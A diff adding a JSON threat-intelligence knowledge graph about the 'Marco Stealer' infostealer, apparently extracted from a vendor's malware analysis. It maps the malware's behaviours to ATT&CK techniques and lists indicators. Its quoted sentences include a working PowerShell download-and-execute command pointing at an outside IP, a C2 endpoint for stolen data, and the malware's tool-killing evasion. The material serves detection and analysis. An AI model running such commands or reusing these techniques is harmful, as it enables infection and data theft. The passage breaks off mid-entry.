@@ -1,0 +1,1377 @@
+{
+  "nodes": {
+    "high_level": [
+      {
+        "node_id": "HL_017c8c7325b4",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "Google Drive",
+        "edges": [
+          "EDGE_1"
+        ],
+        "sentence_indices": [
+          1
+        ],
+        "span_sentences": [
+          "Marco Stealer primarily targets browser data, cryptocurrency wallet information, files from popular cloud services like Dropbox and Google Drive, and other sensitive files stored on the victim’s system."
+        ]
+      },
+      {
+        "node_id": "HL_0607bb9bb168",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "Dropbox",
+        "edges": [
+          "EDGE_2"
+        ],
+        "sentence_indices": [
+          1
+        ],
+        "span_sentences": [
+          "Marco Stealer primarily targets browser data, cryptocurrency wallet information, files from popular cloud services like Dropbox and Google Drive, and other sensitive files stored on the victim’s system."
+        ]
+      },
+      {
+        "node_id": "HL_0a960352959c",
+        "node_class": "high_level",
+        "node_type": "MalwareFamily",
+        "node_text": "Rhadamanthys",
+        "edges": [],
+        "sentence_indices": [
+          56
+        ],
+        "span_sentences": [
+          "Despite recent law enforcement actions that have taken aim at several information stealers such as Rhadamanthys and Lumma, the market for these malware tools remains significant."
+        ]
+      },
+      {
+        "node_id": "HL_44463ac59fa0",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "Windows",
+        "edges": [
+          "EDGE_3",
+          "EDGE_4"
+        ],
+        "sentence_indices": [
+          22,
+          27
+        ],
+        "span_sentences": [
+          "The information stealer begins by querying the machine GUID from the Windows registry, generating a unique hardware identifier that serves as an infection identifier.",
+          "Marco Stealer looks for antivirus software by scanning the Windows Security Center registry path (ROOT\\SecurityCenter2\n)."
+        ]
+      },
+      {
+        "node_id": "HL_500195406665",
+        "node_class": "high_level",
+        "node_type": "MalwareFamily",
+        "node_text": "Marco Stealer",
+        "edges": [
+          "EDGE_5",
+          "EDGE_6",
+          "EDGE_7",
+          "EDGE_8",
+          "EDGE_9",
+          "EDGE_10",
+          "EDGE_11",
+          "EDGE_12",
+          "EDGE_13",
+          "EDGE_14",
+          "EDGE_15",
+          "EDGE_16",
+          "EDGE_17",
+          "EDGE_18",
+          "EDGE_19",
+          "EDGE_20",
+          "EDGE_21",
+          "EDGE_22",
+          "EDGE_23",
+          "EDGE_24",
+          "EDGE_25"
+        ],
+        "sentence_indices": [
+          0,
+          1,
+          2,
+          7,
+          8,
+          9,
+          13,
+          14,
+          15,
+          16,
+          18,
+          21,
+          23,
+          27,
+          29,
+          30,
+          32,
+          34,
+          35,
+          36,
+          37,
+          40,
+          44,
+          46,
+          47,
+          48,
+          53
+        ],
+        "span_sentences": [
+          "Zscaler ThreatLabz has discovered an information stealer that we named Marco Stealer, which was first observed in June 2025.",
+          "Marco Stealer primarily targets browser data, cryptocurrency wallet information, files from popular cloud services like Dropbox and Google Drive, and other sensitive files stored on the victim’s system.",
+          "Marco Stealer implements several anti-analysis techniques including string encryption and terminating security tools.",
+          "Marco Stealer samples have the Program Database (PDB) file path C:\\Users\\marco\\Desktop\\Builder\\Builder\\Client\\Client\\x64\\Release\\Client.pdb\n.",
+          "When Marco Stealer is executed, the malware employs a static mutex named Global\\ItsMeRavenOnYourMachineed.",
+          "Marco Stealer leverages encrypted strings throughout its operations.",
+          "Using Windows APIs, Marco Stealer enumerates running processes and retrieves their executable file paths.",
+          "Once the paths are identified, the information stealer extracts the version metadata from the files, which includes:\nOriginalFilename\nProductName\nCompanyName\nTo collect this metadata, Marco Stealer queries the following paths:\n\\VarFileInfo\\Translation\ndetermines the language and code page of the file.\\StringFileInfo\\LANGCODEPAGE\nprovides access to the fields listed above.",
+          "If any of the metadata collected matches the name of a common anti-analysis tool such as x64dbg, Wireshark, Process Hacker, or OllyDbg, Marco Stealer terminates the corresponding process to evade analysis.",
+          "Following the initial checks, Marco Stealer verifies internet connectivity by attempting to reach https://www.google.com\n.",
+          "If the connectivity check succeeds, Marco Stealer begins gathering IP geolocation data.",
+          "After confirming internet connectivity, Marco Stealer initiates data collection to build a profile of the victim's machine.",
+          "All data gathered by Marco Stealer is encrypted using AES before being sent individually to the C2 server.",
+          "Marco Stealer looks for antivirus software by scanning the Windows Security Center registry path (ROOT\\SecurityCenter2\n).",
+          "Marco Stealer also collects installed software by querying specific registry keys, including:\nSOFTWARE\\Microsoft\\\"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Installer\\UserData\\S-1-5-18\\Products\nWindows\\CurrentVersion\\Uninstaller\nFrom these registry locations, Marco Stealer extracts application names by reading the DisplayName.",
+          "Marco Stealer identifies all active processes on the system.",
+          "Marco Stealer employs two distinct functions designed to exfiltrate browser data, leveraging two embedded files: chromeDecryptor.dll\nand needme.exe\n.",
+          "Marco Stealer first creates a directory in %appdata%\\local\\temp\n, using the Mersenne Twister algorithm to generate a unique path.",
+          "Marco Stealer initiates exfiltration by enumerating and terminating instances of various browsers, including lesser-known ones such as Basilisk, CLIQZ, and Pale Moon.",
+          "After this process is complete, Marco Stealer extracts the previously mentioned needMe.exe\nexecutable.",
+          "Next, Marco Stealer establishes a named pipe, \\\\.\\pipe\\FirefoxBrowserExtractor\n, configured with bidirectional communication (PIPE_ACCESS_DUPLEX\n) and a buffer size of 8192 bytes (0x2000).",
+          "Marco Stealer focuses on extracting cryptocurrency wallet data in Chromium-based browsers.",
+          "Marco Stealer collects data from different software, applications, and services.",
+          "Clipboard content is also targeted, with Marco Stealer harvesting data for any sensitive information copied by the user.",
+          "Marco Stealer is also capable of capturing screenshots, and designed to recursively search through a wide range of commonly used local directories and cloud service locations to locate sensitive files,  with names or extensions that are likely to contain confidential information.",
+          "Marco Stealer uses AES-256 CBC encryption to protect stolen data that is sent to its C2 server.",
+          "Marco Stealer is a new information stealer designed to steal browser data, cryptocurrency wallet information, and sensitive files (both locally and from cloud services)."
+        ]
+      },
+      {
+        "node_id": "HL_5263b8dc8ecf",
+        "node_class": "high_level",
+        "node_type": "MalwareFamily",
+        "node_text": "Lumma",
+        "edges": [],
+        "sentence_indices": [
+          56
+        ],
+        "span_sentences": [
+          "Despite recent law enforcement actions that have taken aim at several information stealers such as Rhadamanthys and Lumma, the market for these malware tools remains significant."
+        ]
+      },
+      {
+        "node_id": "HL_59714c774266",
+        "node_class": "high_level",
+        "node_type": "Tool",
+        "node_text": "OllyDbg",
+        "edges": [
+          "EDGE_26",
+          "EDGE_27"
+        ],
+        "sentence_indices": [
+          15
+        ],
+        "span_sentences": [
+          "If any of the metadata collected matches the name of a common anti-analysis tool such as x64dbg, Wireshark, Process Hacker, or OllyDbg, Marco Stealer terminates the corresponding process to evade analysis."
+        ]
+      },
+      {
+        "node_id": "HL_65406e74d48b",
+        "node_class": "high_level",
+        "node_type": "Tool",
+        "node_text": "Process Hacker",
+        "edges": [
+          "EDGE_28",
+          "EDGE_29"
+        ],
+        "sentence_indices": [
+          15
+        ],
+        "span_sentences": [
+          "If any of the metadata collected matches the name of a common anti-analysis tool such as x64dbg, Wireshark, Process Hacker, or OllyDbg, Marco Stealer terminates the corresponding process to evade analysis."
+        ]
+      },
+      {
+        "node_id": "HL_8e1659bea8b4",
+        "node_class": "high_level",
+        "node_type": "Organization",
+        "node_text": "Zscaler ThreatLabz",
+        "edges": [],
+        "sentence_indices": [
+          0
+        ],
+        "span_sentences": [
+          "Zscaler ThreatLabz has discovered an information stealer that we named Marco Stealer, which was first observed in June 2025."
+        ]
+      },
+      {
+        "node_id": "HL_94cb70a0d4e9",
+        "node_class": "high_level",
+        "node_type": "Tool",
+        "node_text": "x64dbg",
+        "edges": [
+          "EDGE_30",
+          "EDGE_31"
+        ],
+        "sentence_indices": [
+          15
+        ],
+        "span_sentences": [
+          "If any of the metadata collected matches the name of a common anti-analysis tool such as x64dbg, Wireshark, Process Hacker, or OllyDbg, Marco Stealer terminates the corresponding process to evade analysis."
+        ]
+      },
+      {
+        "node_id": "HL_a81bc98d80e7",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "PowerShell",
+        "edges": [
+          "EDGE_32"
+        ],
+        "sentence_indices": [
+          4,
+          5,
+          6
+        ],
+        "span_sentences": [
+          "The downloader component decrypts multiple strings using AES-128 in ECB mode to generate a PowerShell command, which it executes as a child process to initiate the next stage of the attack.",
+          "An example of the decrypted PowerShell command is shown below.",
+          "cmdline:powershell.exe -ExecutionPolicy ByPass -Command \"$client = New-Object System.Net.WebClient; $client.Headers.Add('X-Custom-Auth', 'eyJhbGciOiJJUzI1NiIsInR5cCI6IkpXVCJ9.c2FzdGVkX2NyZWRzXzg5N2E0OWIyZjZjNGViZDc1ZWQzNDlkNzI4MTc2NWRiX2MzOGVhYTQw');\n$client.Headers.Add('User-Agent', 'Zephyr-Downloader/3.7.18-zx9b (Compatible; QuartzCore/945; SageBridge/XRT-71a)'); $client.DownloadFile('http://217.156.50.228:8181/nujbOqrNYyLXXLmOhPpY/PNcWncSY.exe', 'C:\\Users\\PJones\\AppData\\Local\\Temp\\knmQSGUZ\\FILhFvaZ.exe');\nStart-Process 'C:\\Users\\PJones\\AppData\\Local\\Temp\\knmQSGUZ\\FILhFvaZ.exe'\"\nIn this example, the WebClient object downloads the Marco Stealer executable file from the URL http[:/]/217[.]156[.]50[.]228[:]8181/nujbOqrNYyLXXLmOhPpY/PNcWncSY.exe\nto the temporary path AppData\\Local\\Temp\\knmQSGUZ\\FILhFvaZ.exe\nand executes it."
+        ]
+      },
+      {
+        "node_id": "HL_cd8b31b9663b",
+        "node_class": "high_level",
+        "node_type": "Tool",
+        "node_text": "Wireshark",
+        "edges": [
+          "EDGE_33",
+          "EDGE_34"
+        ],
+        "sentence_indices": [
+          15
+        ],
+        "span_sentences": [
+          "If any of the metadata collected matches the name of a common anti-analysis tool such as x64dbg, Wireshark, Process Hacker, or OllyDbg, Marco Stealer terminates the corresponding process to evade analysis."
+        ]
+      },
+      {
+        "node_id": "HL_f875456ba1b3",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "Windows Security Center",
+        "edges": [
+          "EDGE_35"
+        ],
+        "sentence_indices": [
+          27
+        ],
+        "span_sentences": [
+          "Marco Stealer looks for antivirus software by scanning the Windows Security Center registry path (ROOT\\SecurityCenter2\n)."
+        ]
+      }
+    ],
+    "ttp": [
+      {
+        "node_id": "TTP_T1005",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1005",
+        "edges": [
+          "EDGE_5"
+        ],
+        "best_span_ranges": [
+          [
+            32,
+            32
+          ],
+          [
+            40,
+            43
+          ],
+          [
+            47,
+            47
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "Marco Stealer employs two distinct functions designed to exfiltrate browser data, leveraging two embedded files: chromeDecryptor.dll\nand needme.exe\n."
+          ],
+          [
+            "Marco Stealer focuses on extracting cryptocurrency wallet data in Chromium-based browsers.",
+            "A comprehensive list of targeted browsers is available in the Appendix section at the end of this blog.",
+            ", it validates their existence using the GetFileAttributes\nAPI.",
+            "Upon locating extension directories containing cryptocurrency wallet data, the information stealer extracts, encrypts, and exfiltrates the data to a C2 server."
+          ],
+          [
+            "Marco Stealer is also capable of capturing screenshots, and designed to recursively search through a wide range of commonly used local directories and cloud service locations to locate sensitive files,  with names or extensions that are likely to contain confidential information."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1012",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1012",
+        "edges": [
+          "EDGE_3",
+          "EDGE_6",
+          "EDGE_38",
+          "EDGE_41"
+        ],
+        "best_span_ranges": [
+          [
+            27,
+            27
+          ],
+          [
+            29,
+            29
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "Marco Stealer looks for antivirus software by scanning the Windows Security Center registry path (ROOT\\SecurityCenter2\n)."
+          ],
+          [
+            "Marco Stealer also collects installed software by querying specific registry keys, including:\nSOFTWARE\\Microsoft\\\"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Installer\\UserData\\S-1-5-18\\Products\nWindows\\CurrentVersion\\Uninstaller\nFrom these registry locations, Marco Stealer extracts application names by reading the DisplayName."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1027",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1027",
+        "edges": [
+          "EDGE_7"
+        ],
+        "best_span_ranges": [
+          [
+            2,
+            2
+          ],
+          [
+            2,
+            3
+          ],
+          [
+            9,
+            11
+          ],
+          [
+            48,
+            48
+          ],
+          [
+            52,
+            55
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "Marco Stealer implements several anti-analysis techniques including string encryption and terminating security tools."
+          ],
+          [
+            "Marco Stealer implements several anti-analysis techniques including string encryption and terminating security tools.",
+            "The malware leverages HTTP for command-and-control (C2) with messages encrypted with 256-bit AES."
+          ],
+          [
+            "Marco Stealer leverages encrypted strings throughout its operations.",
+            "These encrypted strings are used in nearly all functions and decrypted on execution.",
+            "The string encryption algorithm is an add–rotate–XOR (ARX) based similar to ChaCha20."
+          ],
+          [
+            "Marco Stealer uses AES-256 CBC encryption to protect stolen data that is sent to its C2 server."
+          ],
+          [
+            "The encrypted data, including the victim's client ID and hardware ID, is then sent to the predefined C2 endpoint (e.g., http://45.74.19[.]20:49259/receive\n) via an HTTP POST request with HTTP User-Agent field set to DataSender.",
+            "Marco Stealer is a new information stealer designed to steal browser data, cryptocurrency wallet information, and sensitive files (both locally and from cloud services).",
+            "The malware employs string encryption and attempts to defeat dynamic analysis tools.",
+            "Network communications are protected by 256-bit AES-256 encryption to transmit stolen data over HTTP."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1041",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1041",
+        "edges": [
+          "EDGE_8",
+          "EDGE_42",
+          "EDGE_47"
+        ],
+        "best_span_ranges": [
+          [
+            18,
+            19
+          ],
+          [
+            23,
+            23
+          ],
+          [
+            40,
+            43
+          ],
+          [
+            48,
+            48
+          ],
+          [
+            52,
+            55
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "If the connectivity check succeeds, Marco Stealer begins gathering IP geolocation data.",
+            "The information stealer queries services like https://ipinfo.io/ip\nand https://ipinfo.io/country\nto retrieve the external IP address and country code of the victim’s machine, which is sent to the C2 server."
+          ],
+          [
+            "All data gathered by Marco Stealer is encrypted using AES before being sent individually to the C2 server."
+          ],
+          [
+            "Marco Stealer focuses on extracting cryptocurrency wallet data in Chromium-based browsers.",
+            "A comprehensive list of targeted browsers is available in the Appendix section at the end of this blog.",
+            ", it validates their existence using the GetFileAttributes\nAPI.",
+            "Upon locating extension directories containing cryptocurrency wallet data, the information stealer extracts, encrypts, and exfiltrates the data to a C2 server."
+          ],
+          [
+            "Marco Stealer uses AES-256 CBC encryption to protect stolen data that is sent to its C2 server."
+          ],
+          [
+            "The encrypted data, including the victim's client ID and hardware ID, is then sent to the predefined C2 endpoint (e.g., http://45.74.19[.]20:49259/receive\n) via an HTTP POST request with HTTP User-Agent field set to DataSender.",
+            "Marco Stealer is a new information stealer designed to steal browser data, cryptocurrency wallet information, and sensitive files (both locally and from cloud services).",
+            "The malware employs string encryption and attempts to defeat dynamic analysis tools.",
+            "Network communications are protected by 256-bit AES-256 encryption to transmit stolen data over HTTP."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1047",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1047",
+        "edges": [
+          "EDGE_9"
+        ],
+        "best_span_ranges": [
+          [
+            27,
+            28
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "Marco Stealer looks for antivirus software by scanning the Windows Security Center registry path (ROOT\\SecurityCenter2\n).",
+            "The malware performs Component Object Model (COM) interactions using DllCanUnloadNow\nand runs a Windows Management Instrumentation (WMI) query (SELECT * FROM AntiVirusProduct\n) to enumerate all active antivirus products installed on the device."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1057",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1057",
+        "edges": [
+          "EDGE_10"
+        ],
+        "best_span_ranges": [
+          [
+            13,
+            13
+          ],
+          [
+            30,
+            31
+          ],
+          [
+            35,
+            35
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "Using Windows APIs, Marco Stealer enumerates running processes and retrieves their executable file paths."
+          ],
+          [
+            "Marco Stealer identifies all active processes on the system.",
+            "It uses the QueryFullProcessImageNameW."
+          ],
+          [
+            "Marco Stealer initiates exfiltration by enumerating and terminating instances of various browsers, including lesser-known ones such as Basilisk, CLIQZ, and Pale Moon."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1059",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1059",
+        "edges": [
+          "EDGE_11",
+          "EDGE_32",
+          "EDGE_36",
+          "EDGE_45"
+        ],
+        "best_span_ranges": [
+          [
+            4,
+            4
+          ],
+          [
+            6,
+            6
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "The downloader component decrypts multiple strings using AES-128 in ECB mode to generate a PowerShell command, which it executes as a child process to initiate the next stage of the attack."
+          ],
+          [
+            "cmdline:powershell.exe -ExecutionPolicy ByPass -Command \"$client = New-Object System.Net.WebClient; $client.Headers.Add('X-Custom-Auth', 'eyJhbGciOiJJUzI1NiIsInR5cCI6IkpXVCJ9.c2FzdGVkX2NyZWRzXzg5N2E0OWIyZjZjNGViZDc1ZWQzNDlkNzI4MTc2NWRiX2MzOGVhYTQw');\n$client.Headers.Add('User-Agent', 'Zephyr-Downloader/3.7.18-zx9b (Compatible; QuartzCore/945; SageBridge/XRT-71a)'); $client.DownloadFile('http://217.156.50.228:8181/nujbOqrNYyLXXLmOhPpY/PNcWncSY.exe', 'C:\\Users\\PJones\\AppData\\Local\\Temp\\knmQSGUZ\\FILhFvaZ.exe');\nStart-Process 'C:\\Users\\PJones\\AppData\\Local\\Temp\\knmQSGUZ\\FILhFvaZ.exe'\"\nIn this example, the WebClient object downloads the Marco Stealer executable file from the URL http[:/]/217[.]156[.]50[.]228[:]8181/nujbOqrNYyLXXLmOhPpY/PNcWncSY.exe\nto the temporary path AppData\\Local\\Temp\\knmQSGUZ\\FILhFvaZ.exe\nand executes it."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1070",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1070",
+        "edges": [
+          "EDGE_12"
+        ],
+        "best_span_ranges": [
+          [
+            17,
+            21
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "If the machine is offline or the connection check fails, the information stealer initiates a self-deletion routine, removing its executable from the system and terminating its process.",
+            "If the connectivity check succeeds, Marco Stealer begins gathering IP geolocation data.",
+            "The information stealer queries services like https://ipinfo.io/ip\nand https://ipinfo.io/country\nto retrieve the external IP address and country code of the victim’s machine, which is sent to the C2 server.",
+            "System data collection.",
+            "After confirming internet connectivity, Marco Stealer initiates data collection to build a profile of the victim's machine."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1071",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1071",
+        "edges": [
+          "EDGE_13",
+          "EDGE_43",
+          "EDGE_48"
+        ],
+        "best_span_ranges": [
+          [
+            2,
+            3
+          ],
+          [
+            16,
+            16
+          ],
+          [
+            19,
+            22
+          ],
+          [
+            52,
+            55
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "Marco Stealer implements several anti-analysis techniques including string encryption and terminating security tools.",
+            "The malware leverages HTTP for command-and-control (C2) with messages encrypted with 256-bit AES."
+          ],
+          [
+            "Following the initial checks, Marco Stealer verifies internet connectivity by attempting to reach https://www.google.com\n."
+          ],
+          [
+            "The information stealer queries services like https://ipinfo.io/ip\nand https://ipinfo.io/country\nto retrieve the external IP address and country code of the victim’s machine, which is sent to the C2 server.",
+            "System data collection.",
+            "After confirming internet connectivity, Marco Stealer initiates data collection to build a profile of the victim's machine.",
+            "The information stealer begins by querying the machine GUID from the Windows registry, generating a unique hardware identifier that serves as an infection identifier."
+          ],
+          [
+            "The encrypted data, including the victim's client ID and hardware ID, is then sent to the predefined C2 endpoint (e.g., http://45.74.19[.]20:49259/receive\n) via an HTTP POST request with HTTP User-Agent field set to DataSender.",
+            "Marco Stealer is a new information stealer designed to steal browser data, cryptocurrency wallet information, and sensitive files (both locally and from cloud services).",
+            "The malware employs string encryption and attempts to defeat dynamic analysis tools.",
+            "Network communications are protected by 256-bit AES-256 encryption to transmit stolen data over HTTP."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1082",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1082",
+        "edges": [
+          "EDGE_4",
+          "EDGE_14"
+        ],
+        "best_span_ranges": [
+          [
+            19,
+            22
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "The information stealer queries services like https://ipinfo.io/ip\nand https://ipinfo.io/country\nto retrieve the external IP address and country code of the victim’s machine, which is sent to the C2 server.",
+            "System data collection.",
+            "After confirming internet connectivity, Marco Stealer initiates data collection to build a profile of the victim's machine.",
+            "The information stealer begins by querying the machine GUID from the Windows registry, generating a unique hardware identifier that serves as an infection identifier."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1083",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1083",
+        "edges": [
+          "EDGE_15"
+        ],
+        "best_span_ranges": [
+          [
+            47,
+            47
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "Marco Stealer is also capable of capturing screenshots, and designed to recursively search through a wide range of commonly used local directories and cloud service locations to locate sensitive files,  with names or extensions that are likely to contain confidential information."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1105",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1105",
+        "edges": [
+          "EDGE_16",
+          "EDGE_37",
+          "EDGE_39",
+          "EDGE_40",
+          "EDGE_46"
+        ],
+        "best_span_ranges": [
+          [
+            6,
+            6
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "cmdline:powershell.exe -ExecutionPolicy ByPass -Command \"$client = New-Object System.Net.WebClient; $client.Headers.Add('X-Custom-Auth', 'eyJhbGciOiJJUzI1NiIsInR5cCI6IkpXVCJ9.c2FzdGVkX2NyZWRzXzg5N2E0OWIyZjZjNGViZDc1ZWQzNDlkNzI4MTc2NWRiX2MzOGVhYTQw');\n$client.Headers.Add('User-Agent', 'Zephyr-Downloader/3.7.18-zx9b (Compatible; QuartzCore/945; SageBridge/XRT-71a)'); $client.DownloadFile('http://217.156.50.228:8181/nujbOqrNYyLXXLmOhPpY/PNcWncSY.exe', 'C:\\Users\\PJones\\AppData\\Local\\Temp\\knmQSGUZ\\FILhFvaZ.exe');\nStart-Process 'C:\\Users\\PJones\\AppData\\Local\\Temp\\knmQSGUZ\\FILhFvaZ.exe'\"\nIn this example, the WebClient object downloads the Marco Stealer executable file from the URL http[:/]/217[.]156[.]50[.]228[:]8181/nujbOqrNYyLXXLmOhPpY/PNcWncSY.exe\nto the temporary path AppData\\Local\\Temp\\knmQSGUZ\\FILhFvaZ.exe\nand executes it."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1106",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1106",
+        "edges": [
+          "EDGE_17"
+        ],
+        "best_span_ranges": [
+          [
+            13,
+            13
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "Using Windows APIs, Marco Stealer enumerates running processes and retrieves their executable file paths."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1113",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1113",
+        "edges": [
+          "EDGE_18"
+        ],
+        "best_span_ranges": [
+          [
+            47,
+            47
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "Marco Stealer is also capable of capturing screenshots, and designed to recursively search through a wide range of commonly used local directories and cloud service locations to locate sensitive files,  with names or extensions that are likely to contain confidential information."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1115",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1115",
+        "edges": [
+          "EDGE_19"
+        ],
+        "best_span_ranges": [
+          [
+            46,
+            46
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "Clipboard content is also targeted, with Marco Stealer harvesting data for any sensitive information copied by the user."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1140",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1140",
+        "edges": [
+          "EDGE_20"
+        ],
+        "best_span_ranges": [
+          [
+            4,
+            4
+          ],
+          [
+            9,
+            11
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "The downloader component decrypts multiple strings using AES-128 in ECB mode to generate a PowerShell command, which it executes as a child process to initiate the next stage of the attack."
+          ],
+          [
+            "Marco Stealer leverages encrypted strings throughout its operations.",
+            "These encrypted strings are used in nearly all functions and decrypted on execution.",
+            "The string encryption algorithm is an add–rotate–XOR (ARX) based similar to ChaCha20."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1518",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1518",
+        "edges": [
+          "EDGE_21",
+          "EDGE_26",
+          "EDGE_28",
+          "EDGE_30",
+          "EDGE_33",
+          "EDGE_35"
+        ],
+        "best_span_ranges": [
+          [
+            14,
+            14
+          ],
+          [
+            27,
+            27
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "Once the paths are identified, the information stealer extracts the version metadata from the files, which includes:\nOriginalFilename\nProductName\nCompanyName\nTo collect this metadata, Marco Stealer queries the following paths:\n\\VarFileInfo\\Translation\ndetermines the language and code page of the file.\\StringFileInfo\\LANGCODEPAGE\nprovides access to the fields listed above."
+          ],
+          [
+            "Marco Stealer looks for antivirus software by scanning the Windows Security Center registry path (ROOT\\SecurityCenter2\n)."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1530",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1530",
+        "edges": [
+          "EDGE_1",
+          "EDGE_2",
+          "EDGE_22"
+        ],
+        "best_span_ranges": [
+          [
+            1,
+            1
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "Marco Stealer primarily targets browser data, cryptocurrency wallet information, files from popular cloud services like Dropbox and Google Drive, and other sensitive files stored on the victim’s system."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1560",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1560",
+        "edges": [
+          "EDGE_23"
+        ],
+        "best_span_ranges": [
+          [
+            23,
+            23
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "All data gathered by Marco Stealer is encrypted using AES before being sent individually to the C2 server."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1562",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1562",
+        "edges": [
+          "EDGE_27",
+          "EDGE_29",
+          "EDGE_31",
+          "EDGE_34"
+        ],
+        "best_span_ranges": [
+          [
+            2,
+            2
+          ],
+          [
+            15,
+            15
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "Marco Stealer implements several anti-analysis techniques including string encryption and terminating security tools."
+          ],
+          [
+            "If any of the metadata collected matches the name of a common anti-analysis tool such as x64dbg, Wireshark, Process Hacker, or OllyDbg, Marco Stealer terminates the corresponding process to evade analysis."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1573",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1573",
+        "edges": [
+          "EDGE_24"
+        ],
+        "best_span_ranges": [
+          [
+            48,
+            48
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "Marco Stealer uses AES-256 CBC encryption to protect stolen data that is sent to its C2 server."
+          ]
+        ]
+      },
+      {
+        "node_id": "TTP_T1590",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "T1590",
+        "edges": [
+          "EDGE_25",
+          "EDGE_44",
+          "EDGE_49"
+        ],
+        "best_span_ranges": [
+          [
+            18,
+            19
+          ]
+        ],
+        "best_span_sentences_list": [
+          [
+            "If the connectivity check succeeds, Marco Stealer begins gathering IP geolocation data.",
+            "The information stealer queries services like https://ipinfo.io/ip\nand https://ipinfo.io/country\nto retrieve the external IP address and country code of the victim’s machine, which is sent to the C2 server."
+          ]
+        ]
+      }
+    ],
+    "ioc": [
+      {
+        "node_id": "IOC_050a97ecde0d",
+        "node_class": "ioc",
+        "node_type": "URL",
+        "node_text": "https://www.google.com",
+        "edges": [],
+        "sentence_indices": [
+          16
+        ],
+        "span_sentences": [
+          "Following the initial checks, Marco Stealer verifies internet connectivity by attempting to reach https://www.google.com\n."
+        ]
+      },
+      {
+        "node_id": "IOC_1490a31b8cbe",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "C:\\Users\\PJones\\AppData\\Local\\Temp\\knmQSGUZ\\FILhFvaZ.exe",
+        "edges": [
+          "EDGE_36",
+          "EDGE_37"
+        ],
+        "sentence_indices": [
+          6
+        ],
+        "span_sentences": [
